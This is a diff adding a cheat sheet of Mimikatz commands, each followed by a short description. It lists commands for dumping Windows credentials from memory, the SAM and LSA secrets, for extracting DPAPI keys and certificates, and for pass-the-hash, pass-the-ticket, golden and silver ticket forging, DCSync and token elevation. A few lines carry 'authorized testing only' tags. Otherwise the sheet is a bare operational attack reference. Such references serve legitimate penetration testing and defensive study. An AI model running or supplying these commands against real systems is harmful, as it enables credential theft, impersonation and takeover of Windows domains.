@@ -1,0 +1,94 @@
+[X] Mimikatz Command List
+
+[\] mimikatz.exe
+[/] Start Mimikatz
+
+[\] privilege::debug
+[/] Enable debug privileges (required for most actions)
+
+[\] sekurlsa::logonpasswords
+[/] Dump credentials from memory (authorized testing only)
+
+[\] sekurlsa::logonpasswords full
+[/] Full detailed credential dump
+
+[\] sekurlsa::msv
+[/] Dump MSV credentials
+
+[\] sekurlsa::wdigest
+[/] Dump WDigest plaintext creds (if enabled)
+
+[\] sekurlsa::kerberos
+[/] Dump Kerberos tickets
+
+[\] sekurlsa::tspkg
+[/] Dump TSPKG credentials
+
+[\] sekurlsa::livessp
+[/] Dump LiveSSP credentials
+
+[\] sekurlsa::dpapi
+[/] Dump DPAPI master keys
+
+[\] sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH
+[/] Pass‑the‑Hash (authorized testing only)
+
+[\] sekurlsa::ekeys
+[/] Dump Kerberos encryption keys
+
+[\] sekurlsa::tickets
+[/] List Kerberos tickets
+
+[\] kerberos::list
+[/] List Kerberos tickets (alt method)
+
+[\] kerberos::ptt ticket.kirbi
+[/] Pass‑the‑Ticket (authorized testing only)
+
+[\] kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH
+[/] Create Golden Ticket (authorized testing only)
+
+[\] kerberos::silver /service:cifs /target:SERVER /rc4:HASH
+[/] Create Silver Ticket (authorized testing only)
+
+[\] lsadump::sam
+[/] Dump SAM database
+
+[\] lsadump::lsa
+[/] Dump LSA secrets
+
+[\] lsadump::secrets
+[/] Dump cached secrets
+
+[\] lsadump::dcsync /user:DOMAIN\krbtgt
+[/] DCSync attack (authorized testing only)
+
+[\] token::list
+[/] List available tokens
+
+[\] token::elevate
+[/] Elevate to SYSTEM token
+
+[\] token::whoami
+[/] Show current token identity
+
+[\] privilege::debug
+[/] Enable debug privileges again if needed
+
+[\] crypto::certificates /systemstore:local_machine
+[/] List certificates
+
+[\] crypto::keys /systemstore:local_machine
+[/] List private keys
+
+[\] dpapi::cred
+[/] Dump DPAPI credentials
+
+[\] dpapi::masterkey /in:masterkeyfile
+[/] Decrypt DPAPI masterkey
+
+[\] sekurlsa::minidump lsass.dmp
+[/] Load offline LSASS dump
+
+[\] exit
+[/] Quit Mimikatz
